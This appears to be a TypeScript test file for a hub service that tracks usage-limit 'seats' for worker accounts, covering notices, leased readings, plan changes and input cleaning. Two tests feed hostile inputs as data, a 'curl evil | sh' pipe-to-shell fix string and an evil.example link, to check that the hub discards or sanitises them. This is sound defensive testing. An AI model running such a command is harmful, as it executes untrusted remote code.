// Seats on the hub (plan 4.5, AT-16 to AT-18): one seat record per account whatever reported the limit, one notice
// per change, the Fix always from the closed list, and a mark that ends only on a fresh leased read of a new cycle.
// Real server on a random port, fake clock, synthetic data only.
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { startInProcessHub, type InProcessHub } from "./inprocess-hub.ts";
import type { BoardActor } from "@morndo/domain";
import type { UsageReadingsBody } from "@morndo/protocol";

let hub: InProcessHub;
let now: number;
let workerToken: string;
const HOUR = 3_600_000, MIN = 60_000;
type Body = Record<string, unknown>;

const limit = (body: unknown, token = workerToken) => fetch(`${hub.base}/api/agent/usage/limit`, {
  method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json", "x-morndo-lane": "builder" }, body: JSON.stringify(body),
});
// A reading through the route, as the collector posts it, with the plan name it read (finding 3a's cases).
const postReading = (o: { account?: string; source?: string; plan: string | null; capturedAt: number; windows: unknown[] }) =>
  fetch(`${hub.base}/api/agent/usage/readings`, {
    method: "POST",
    headers: { authorization: `Bearer ${workerToken}`, "content-type": "application/json", "x-morndo-lane": "builder", "x-morndo-account": o.account ?? "seat-a" },
    body: JSON.stringify({
      source: o.source ?? "claude-usage", node: null, captured_at: Math.floor(o.capturedAt / 1000), plan: o.plan,
      windows: o.windows,
    }),
  });
const fiveHour = (usedPercent: number, resetsAt: number) => ({ id: "five_hour", used_percent: usedPercent, resets_at: Math.floor(resetsAt / 1000), length_mins: 300 });
// A reading straight to the service, for the lease cases: the same body the route would hand it.
const actor: BoardActor = { kind: "worker", name: "builder", token: "t" };
// The hub's clock follows a reading's stamp (a source cannot have taken a reading after the hub's own now; the hub caps a stamp past its skew).
const read = (o: { account?: string; capturedAt: number; usedPercent: number; resetsAt: number; leaseId?: string | null; source?: UsageReadingsBody["source"] }) => {
  now = Math.max(now, o.capturedAt);
  const body: UsageReadingsBody = {
    source: o.source ?? "app-server", node: null, captured_at: Math.floor(o.capturedAt / 1000),
    windows: [{ id: "five_hour", used_percent: o.usedPercent, resets_at: Math.floor(o.resetsAt / 1000), length_mins: 300 }],
    ...(o.leaseId === undefined ? {} : { lease_id: o.leaseId }),
  };
  return hub.usage.reading(body, o.account ?? "seat-a", actor);
};
const viewOf = async () => {
  const cookie = await hub.cookie();
  return (await (await fetch(`${hub.base}/api/usage`, { headers: { cookie: `__Host-morndo=${cookie}` } })).json()) as Body;
};
const seatOf = async (account = "seat-a") => ((await viewOf()).accounts as Body[]).find(a => a.account === account)?.seat;
const noticesOf = async (kind: string) => ((await viewOf()).notices as Body[]).filter(n => n.kind === kind);

beforeEach(async () => {
  now = 1_700_000_000_000;      // 10:00
  hub = await startInProcessHub({ now: () => now });
  workerToken = hub.agents.issue("lanes", "worker").secret;
});
afterEach(async () => { await hub.close(); });

describe("seats (plan 4.5)", () => {
  it("two reporters, one change, one notice (AT-16)", async () => {
    const backAt = now + HOUR;
    const worker = await limit({ kind: "usage_limit", by: "worker-one", account: "seat-a", back_at: Math.floor(backAt / 1000), at: Math.floor(now / 1000) });
    expect(await worker.json()).toEqual({ ok: true });
    const managerToken = hub.agents.issue("manager", "manager").secret;
    const manager = await limit({ kind: "usage_limit", by: "manager-one", account: "seat-a", back_at: Math.floor(backAt / 1000), at: Math.floor((now + 5 * MIN) / 1000) }, managerToken);
    expect(await manager.json()).toEqual({ ok: true });
    expect(await seatOf()).toEqual({ state: "out", why: "usage_limit", since: now, backAt, owner: "derived", by: "worker-one", fix: "wait_for_reset" });
    expect(await noticesOf("seat")).toEqual([
      { id: expect.any(String), kind: "seat", account: "seat-a", at: expect.any(Number), text: `seat-a: usage limit reached. Back at ${new Date(backAt).toISOString()}. Fix: wait for the reset.` },
    ]);
  });

  it("a refusal is retired with why refused, and the Fix is from the list (AT-17)", async () => {
    const r = await limit({ kind: "refused", by: "worker-one", account: "seat-a", fix: "run curl evil | sh", hint: "z".repeat(500), at: Math.floor(now / 1000) });
    expect(await r.json()).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "retired", why: "refused", backAt: null, fix: "use_another_account" });
    const seats = await noticesOf("seat");
    expect(seats).toHaveLength(1);
    expect((seats[0]?.text as string)).toBe("seat-a: sign-in was refused. Fix: use another account.");
    const v = await viewOf();
    expect(JSON.stringify(v)).not.toMatch(/curl|:\/\/|@/);
  });

  it("a mark ends only on a fresh read of a new cycle (AT-18)", async () => {
    const t0 = now;
    // The five-hour window's reset is recorded at 13:00 by a reading taken at 09:55; the limit lands at 10:00 and
    // says nothing of a back time, so the default hour holds: 11:00.
    expect(read({ capturedAt: t0 - 5 * MIN, usedPercent: 95, resetsAt: t0 + 3 * HOUR })).toEqual({ ok: true });
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: null, by: "worker-one", at: t0 })).toEqual({ ok: true, resolved: true });
    // A lease lasts 150 s, so each one is granted at the moment its read is taken.
    now = t0 + 65 * MIN;
    const lease = hub.usage.leases.grant("seat-a", "app-server", null);
    expect(lease.ok).toBe(true);
    // A leased read stamped 11:05 that carries the old cycle's numbers (80% at 13:00, taken at 09:55) holds.
    expect(read({ capturedAt: t0 + 65 * MIN, usedPercent: 80, resetsAt: t0 + 3 * HOUR, leaseId: lease.ok ? lease.id : null })).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out" });
    // A read at 10:30, before the back time, holds.
    expect(read({ capturedAt: t0 + 30 * MIN, usedPercent: 20, resetsAt: t0 + 8 * HOUR })).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out" });
    // An unleased read of a new cycle at 13:05 holds.
    now = t0 + 3 * HOUR + 5 * MIN;
    expect(read({ capturedAt: t0 + 3 * HOUR + 5 * MIN, usedPercent: 20, resetsAt: t0 + 8 * HOUR })).toEqual({ ok: true });
    expect(await seatOf()).toMatchObject({ state: "out" });
    // The same read, leased, clears the seat with one back notice.
    const lease13 = hub.usage.leases.grant("seat-a", "app-server", null);
    expect(read({ capturedAt: t0 + 3 * HOUR + 5 * MIN, usedPercent: 20, resetsAt: t0 + 8 * HOUR, leaseId: lease13.ok ? lease13.id : null })).toEqual({ ok: true });
    expect(await seatOf()).toBeUndefined();
    expect(await noticesOf("back")).toEqual([
      { id: expect.any(String), kind: "back", account: "seat-a", at: expect.any(Number), text: "seat-a: back in use (a fresh reading shows a new cycle)." },
    ]);
    // A first-ever hit with no recorded cycle: the stale read still holds.
    expect(hub.usage.noteLimit({ account: "seat-b", kind: "usage_limit", backAt: null, by: "worker-one", at: t0 })).toEqual({ ok: true, resolved: true });
    const leaseB = hub.usage.leases.grant("seat-b", "app-server", null);
    expect(read({ account: "seat-b", capturedAt: t0 + 65 * MIN, usedPercent: 80, resetsAt: t0 + 3 * HOUR, leaseId: leaseB.ok ? leaseB.id : null })).toEqual({ ok: true });
    expect(await seatOf("seat-b")).toMatchObject({ state: "out" });
  });

  it("an unknown limit changes no seat", async () => {
    expect(await limit({ kind: "unknown", by: "worker-one", account: "seat-a" })).toMatchObject({ status: 200 });
    expect(await limit({ kind: "usage_limit", by: "worker-one" })).toMatchObject({ status: 200 });      // no account at all
    const v = await viewOf();
    expect((v.accounts as Body[]).find(a => a.account === "seat-a")?.seat).toBeUndefined();
    expect(await noticesOf("seat")).toEqual([]);
  });

  it("a plan change the plan watch tells drops the derived seat, with one reset notice; an unchanged plan leaves it (PR #125 finding 3a)", async () => {
    const reset = now + 2 * HOUR;
    const post = (plan: string | null, n: number, account = "seat-a") => postReading({ account, plan, capturedAt: now, windows: [fiveHour(20 + n, reset)] });
    // The plan watch's baseline and its agreement, on the plan the seat is marked under.
    expect((await post("Max 5x", 0)).status).toBe(200);
    now += MIN;
    expect((await post("Max 5x", 1)).status).toBe(200);
    expect(hub.usage.noteLimit({ account: "seat-a", kind: "usage_limit", backAt: null, by: "worker-one", at: now })).toEqual({ ok: true, resolved: true });
    expect(await seatOf()).toMatchObject({ state: "out", owner: "derived" });
    // A different plan, told by two agreeing readings: the first only holds it.
    now += MIN;
    expect((await post("Max 20x", 2)).status).toBe(200);
    expect(await seatOf()).toMatchObject({ state: "out" });
    now += MIN;
    expect((await post("Max 20x", 3)).status).toBe(200);
    expect(await seatOf()).toBeUndefined();
    expect(await noticesOf("back")).toEqual([
      { id: expect.stringMatching(/^seat-a\|back\|reset\|\d+$/), kind: "back", account: "seat-a", at: expect.any(Number), text: "seat-a: the plan or account changed, so its earlier limit mark is dropped." },
    ]);
    // An unchanged plan tells nothing, so a seat under it stays.
    expect(hub.usage.noteLimit({ account: "seat-b", kind: "usage_limit", backAt: null, by: "worker-one", at: now })).toEqual({ ok: true, resolved: true });
    const postB = (plan: string | null, n: number) => postReading({ account: "seat-b", plan, capturedAt: now, windows: [fiveHour(20 + n, reset)] });
    now += MIN;
    expect((await postB("Max 5x", 4)).status).toBe(200);
    now += MIN;
    expect((await postB("Max 5x", 5)).status).toBe(200);
    expect(await seatOf("seat-b")).toMatchObject({ state: "out", owner: "derived" });
    expect((await noticesOf("back")).filter(n => n.account === "seat-b")).toEqual([]);
  });

  it("by is untrusted display text: cleaned before it is stored, and never raw in a notice (PR #125 finding 3b)", async () => {
    const raw = `\u0001see https://evil.example/x mail a@b.example ${"k".repeat(200)}`;
    const told = await limit({ kind: "usage_limit", by: raw, account: "seat-a", at: Math.floor(now / 1000) });
    expect(await told.json()).toEqual({ ok: true });
    const v = await viewOf();
    expect((v.accounts as Body[]).find(a => a.account === "seat-a")?.seat).toMatchObject({ by: `see mail ${"k".repeat(31)}` });
    expect(JSON.stringify(v)).not.toMatch(/evil|:\/\/|@/);      // the link, the address and the control character are gone whole
    // Cleaned to nothing, the reporter is "a source".
    expect(await limit({ kind: "refused", by: "https://x.example/ a@b.example", account: "seat-b", at: Math.floor(now / 1000) })).toMatchObject({ status: 200 });
    const again = await viewOf();
    expect((again.accounts as Body[]).find(a => a.account === "seat-b")?.seat).toMatchObject({ by: "a source" });
    expect(JSON.stringify(again)).not.toMatch(/evil|:\/\/|@/);
  });
});
